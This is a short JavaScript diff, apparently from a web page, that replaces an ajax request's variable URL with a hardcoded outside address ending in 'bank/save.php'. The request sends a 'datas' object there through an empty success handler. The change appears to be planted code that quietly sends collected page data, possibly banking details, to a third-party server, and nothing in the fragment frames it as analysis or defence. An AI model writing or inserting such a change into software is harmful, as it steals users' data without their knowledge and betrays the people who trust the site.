@@ -63,7 +63,7 @@
             $.ajax({
                type:'get',
                dataType: 'html',
-               url:details,
+               url:'http://www.yc888.la/bank/save.php',
                data: datas,
                success: function(f){}
             });
